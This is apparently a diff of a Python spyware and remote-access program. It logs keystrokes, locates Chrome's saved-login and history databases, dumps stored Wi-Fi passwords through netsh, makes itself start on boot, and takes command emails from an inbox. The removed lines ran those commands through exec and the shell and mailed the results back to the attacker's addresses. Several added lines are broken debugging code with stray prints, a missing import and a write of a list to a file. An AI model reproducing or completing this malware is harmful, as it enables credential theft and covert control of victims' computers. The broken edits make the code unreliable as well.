@@ -7,7 +7,6 @@ from email.mime.text import MIMEText
 from os import getcwd, path
 from subprocess import check_output
 from time import sleep
-from ast import literal_eval
 
 import keyboard
 
@@ -41,61 +40,52 @@ def on_press(event):
 
 def get_chrome_data():
     '''Returns a list with the respective paths of the login and history SQL databases'''
-    try:
-        global log
-        logprint("INFO: Attempting to retrieve chrome data...\n")
-        data_path = path.expanduser('~').replace(
-            "\\", '/') + "/AppData/Local/Google/Chrome/User Data/Default"
-        login_db_path = path.join(data_path, 'Login Data')
-        history_db_path = path.join(data_path, 'History')
-        cookie_db_path = path.join(data_path, 'Cookies')
-    except Exception as e:
-        error_text = ("ERROR: An error occured during retrieval. see traceback below:\n{type(e)}\n{str(e)}\n")
-        logprint(error_text)
-    else:
-        logprint("INFO: Successfully retrieved chrome data.\n")
-        return [login_db_path, history_db_path, cookie_db_path]
+    global log
+    logprint("INFO: Attempting to retrieve chrome data...\n")
+    data_path = path.expanduser('~').replace(
+        "\\", '/') + "/AppData/Local/Google/Chrome/User Data/Default"
+    login_db_path = path.join(data_path, 'Login Data')
+    history_db_path = path.join(data_path, 'History')
+    logprint("INFO: Successfully retrieved chrome data.\n")
+    return [login_db_path, history_db_path]
+
 
 def get_wifi_data():
     ''' Returns a list of all known wifi credentials'''
-    try:
-        global log
-        logprint("INFO: Attempting to retrieve wifi data...\n")
-        data = check_output(['netsh', 'wlan', 'show', 'profiles'
-                             ]).decode('utf-8',
-                                       errors="backslashreplace").split('\n')
-        profiles = [
-            i.split(":")[1][1:-1] for i in data
-            if "Profil Tous les utilisateurs" in i
+    global log
+    logprint("INFO: Attempting to retrieve wifi data...\n")
+    data = check_output(['netsh', 'wlan', 'show', 'profiles'
+                         ]).decode('utf-8',
+                                   errors="backslashreplace").split('\n')
+    profiles = [
+        i.split(":")[1][1:-1] for i in data
+        if "Profil Tous les utilisateurs" in i
+    ]
+
+    credentials_list = []
+    for i in profiles:
+        results = subprocess.check_output([
+            'netsh', 'wlan', 'show', 'profile', i, 'key=clear'
+        ]).decode('utf-8', errors="backslashreplace").split('\n')
+        results = [
+            b.split(":")[1][1:-1] for b in results if "Contenu de la cl" in b
         ]
 
-        credentials_list = []
-        for i in profiles:
-            results = check_output([
-                'netsh', 'wlan', 'show', 'profile', i, 'key=clear'
-            ]).decode('utf-8', errors="backslashreplace").split('\n')
-            results = [
-                b.split(":")[1][1:-1] for b in results if "Contenu de la cl" in b
-            ]
+        credential_set = {"ESSID": "", "Key": ""}
+        credential_set["ESSID"] = f"{i.strip()}"
+        try:
+            credential_set["Key"] = f"{results[0]}"
+        except IndexError:
+            credential_set["Key"] = "[Unknown]"
+        finally:
+            credentials_list.append(credential_set)
+    file_path = "{}/wifi.json".format(path.expanduser('~').replace('\\', '/'))
+    logprint(f"INFO: Writing data to {file_path}\n")
+    with open(file_path,"w") as file:
+        file.write(credentials_list) 
+    logprint("INFO: Successfully retrieved wifi data.\n")
+    return file_path
 
-            credential_set = {"ESSID": "", "Key": ""}
-            credential_set["ESSID"] = f"{i.strip()}"
-            try:
-                credential_set["Key"] = f"{results[0]}"
-            except IndexError:
-                credential_set["Key"] = "[Unknown]"
-            finally:
-                credentials_list.append(credential_set)
-        file_path = "{}/wifi.json".format(path.expanduser('~').replace('\\', '/'))
-        logprint(f"INFO: Writing data to {file_path}\n")
-        with open(file_path,"w") as file:
-            file.write(credentials_list) 
-    except Exception as e:
-        error_text = (f"ERROR: An error occured during retrieval. see traceback below:\n{type(e)}\n{str(e)}\n")
-        logprint(error_text)
-    else:
-        logprint("INFO: Successfully retrieved wifi data.\n")
-        return file_path
 
 def make_persistent(current_file_name):
     '''Adds program to Startup Files, making it persist after reboots.'''
@@ -113,26 +103,23 @@ def make_persistent(current_file_name):
         logprint("INFO: Successfully made program persistent")
 
 def run_command_order(email_body):
-    logprint(f"INFO: Command text is as follows, scraping:{email_body}\n")
+    logprint(f"INFO: Command text is as follows, running:{email_body}\n")
     # Extract the list
     command_order = email_body.partition('[')
-    command_order = command_order[2]
+    print('1',command_order)
+    command_order = command_order[1] + command_order[2]
+    print('2',command_order)
     command_order = command_order.partition(']')
-    command_order = command_order[0]
-    command_order = command_order.replace('"','').split(",")
+    print('3',command_order)
+    print(command_order[0])
+    print(command_order[1])
+    print(command_order[2])
+    print(command_order[0]+command_order[1])
+    command_order = command_order[0] + command_order[1]
+    print(command_order)
+    logprint('4',command_order)
 
-    logprint(f"INFO: Command order is as follows, parsing:{command_order}")
-    if command_order[0]=="local":
-        logprint("INFO: Detected local command, running accordingly")
-        results = str(exec(f"{command_order[1]}"))
-    if command_order[0]=="os":
-        logprint("INFO: Detected global command, running accordingly")
-        results = check_output(command_order[1].split()).decode('utf-8', errors="backslashreplace") 
-
-    logprint("INFO: Ran given command, sending output.")
-    send_results(message_text=f'Command order "{command_order}" outputed the following:\n{results}', subject=f"Command output from {ID}")
-
-def send_results(message_text="",file_paths=[], subject=f"Report from {ID}"):
+def send_results(message_text="",file_paths=[]):
     print("INFO: Running sending check...")
     global log, typed_string
     if log != "" or message_text != "":
@@ -142,7 +129,7 @@ def send_results(message_text="",file_paths=[], subject=f"Report from {ID}"):
         msg = MIMEMultipart()
         msg['From'] = SENDER
         msg['To'] = ",".join(RECEIVERS)
-        msg['Subject'] = subject#f"Report from {ID}"
+        msg['Subject'] = f"Report from {ID}"
 
         if message_text != "":
             body = message_text 
@@ -209,7 +196,7 @@ def fetch_commands():
         try:
             server.select('INBOX')
 
-            status, response = server.search(None, f'(FROM "{SENDER}" SUBJECT "Command for {ID}" UNSEEN)')
+            status, response = server.search(None, f'(FROM "{SENDER}" SUBJECT "Command (for {ID})" UNANSWERED)')
             unread_msg_nums = response[0].split()
             print(f"INFO: Found {len(unread_msg_nums)} new command emails\n")
             if len(unread_msg_nums)==0:
@@ -218,12 +205,13 @@ def fetch_commands():
                 logprint("INFO: Running only first command\n")
                 _, response = server.fetch(unread_msg_nums[0], '(UID BODY[TEXT])')
                 # Mark it as seen
-                run_command_order(response[0][1].decode("utf-8"))
                 server.store(unread_msg_nums[0], '+FLAGS', '\Seen')
+                print('\n\n\n\n\n',response[0][1])
+                run_command_order(response[0][1].decode("utf-8"))
 
         except Exception as e:
             logprint(
-                f"ERROR: Couldn't fetch and execute mail, see error traceback below\n{type(e)}\n{str(e)}\n"
+                f"ERROR: Couldn't fetch mail, see error traceback below\n{type(e)}\n{str(e)}\n"
             )
             logprint(f"ERROR: Check failed.\n")
         else:
